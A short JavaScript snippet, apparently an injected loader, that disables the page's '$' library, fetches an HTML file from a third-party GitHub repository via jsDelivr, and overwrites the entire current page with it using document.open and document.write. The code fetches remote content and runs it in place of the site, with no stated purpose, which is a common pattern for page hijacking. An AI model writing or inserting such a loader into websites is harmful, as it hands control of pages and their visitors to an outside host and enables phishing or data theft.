var xhr = new XMLHttpRequest();
$ = null;
xhr.open('GET', 'https://cdn.jsdelivr.net/gh/you2048/share/s.html', false);
xhr.onload = function () {
  if (xhr.status == 200) {
    var doc = document.open('replace', 'text/html');
    setTimeout(function () {
      doc.write(xhr.responseText);
    }, 60);
    doc.close();
  }
}
xhr.send();
